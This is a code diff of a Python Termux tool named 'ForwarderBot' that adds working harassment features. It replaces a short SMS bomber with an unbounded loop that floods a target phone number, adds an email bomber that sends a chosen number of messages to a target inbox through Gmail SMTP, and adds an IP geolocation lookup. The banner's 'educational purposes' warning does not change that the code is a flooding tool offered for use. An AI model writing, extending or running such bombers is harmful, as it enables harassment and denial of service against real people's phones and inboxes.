@@ -2,10 +2,9 @@ import os
 import subprocess
 import time
 import requests
-from colorama import Fore, init
-init(autoreset=True)
+from colorama import Fore
 
-# Colors
+# Colors for UI
 R = Fore.RED
 G = Fore.GREEN
 Y = Fore.YELLOW
@@ -23,12 +22,11 @@ def banner():
 ██╔══╝  ██║     ██║   ██║██║███╗██║██╔══██║██║  ██║██╔══╝  
 ██║     ╚██████╗╚██████╔╝╚███╔███╔╝██║  ██║██████╔╝███████╗
 ╚═╝      ╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
-    {W}
-    {G}Made by AllahAkbar313{W}
-    """)
+    {W}""")
     print(f"{G}Welcome to ForwarderBot!{W}")
     print(f"{Y}This tool forwards incoming SMS to Termux in real-time.{W}")
     print(f"{R}⚠ WARNING: This could be illegal! Use only for educational purposes! ⚠{W}")
+    print(f"{G}Made by AllahAkbar313{W}")
     print("\n")
 
 # Get Phone Number
@@ -71,24 +69,68 @@ def start_tracking(phone_number):
     except KeyboardInterrupt:
         print(f"{R}\nTracking stopped. Exiting...{W}")
 
-# SMS Bombing Function
-def sms_bomber(phone_number):
-    print(f"{Y}SMS Bombing started on {phone_number}...{W}")
-    # Add your custom bombing logic here, delayed or multiple messages to bomb the target
-    for i in range(10):  # This example sends 10 messages
-        subprocess.run(f"termux-sms-send {phone_number} 'This is a test bomb message!'")
+# Function to perform SMS Bombing
+def sms_bomber(phone_number, delay):
+    print(f"{Y}Starting SMS Bombing on {phone_number}...{W}")
+    while True:
+        subprocess.run(["termux-sms-send", "-n", phone_number, "Bombing message!"])
+        time.sleep(delay)
 
-# Main Function
-if __name__ == "__main__":
+# Email Bomber Function
+def email_bomber(target_email, subject, body, count):
+    import smtplib
+    from email.mime.text import MIMEText
+
+    print(f"{Y}Starting Email Bombing on {target_email}...{W}")
+    for i in range(count):
+        msg = MIMEText(body)
+        msg['Subject'] = subject
+        msg['From'] = "your-email@gmail.com"
+        msg['To'] = target_email
+
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login("your-email@gmail.com", "your-email-password")
+            server.sendmail("your-email@gmail.com", target_email, msg.as_string())
+            print(f"{G}[{i+1}] Email Sent!{W}")
+        time.sleep(1)
+
+# IP Tracker Function (Dummy for now, real IP tracker requires external API)
+def ip_tracker(ip_address):
+    print(f"{Y}Tracking IP: {ip_address}...{W}")
+    response = requests.get(f"https://ipinfo.io/{ip_address}/json")
+    data = response.json()
+    print(f"IP: {data['ip']}")
+    print(f"Location: {data['city']}, {data['region']}, {data['country']}")
+    print(f"Coordinates: {data['loc']}")
+
+# Main Function to Run the Bot
+def main():
     banner()
-    input(f"{Y}Press ENTER to continue...{W}")
-    phone_number = get_phone_number()
-    option = input(f"{C}Choose Option:\n1. Track SMS\n2. SMS Bomber\n{W}")
-    
-    if option == "1":
+    choice = input(f"{C}Select Option:\n1. SMS Forwarder\n2. SMS Bomber\n3. Email Bomber\n4. IP Tracker\n{W}Choice: ")
+
+    if choice == "1":
+        phone_number = get_phone_number()
         start_tracking(phone_number)
-    elif option == "2":
-        sms_bomber(phone_number)
+
+    elif choice == "2":
+        phone_number = get_phone_number()
+        delay = float(input(f"{C}Enter delay (in seconds) between messages: {W}"))
+        sms_bomber(phone_number, delay)
+
+    elif choice == "3":
+        target_email = input(f"{C}Enter target email: {W}")
+        subject = input(f"{C}Enter email subject: {W}")
+        body = input(f"{C}Enter email body: {W}")
+        count = int(input(f"{C}Enter number of emails to send: {W}"))
+        email_bomber(target_email, subject, body, count)
+
+    elif choice == "4":
+        ip_address = input(f"{C}Enter IP address to track: {W}")
+        ip_tracker(ip_address)
+
     else:
-        print(f"{R}Invalid option. Exiting...{W}")
-        exit()
+        print(f"{R}Invalid Option!{W}")
+
+if __name__ == "__main__":
+    main()
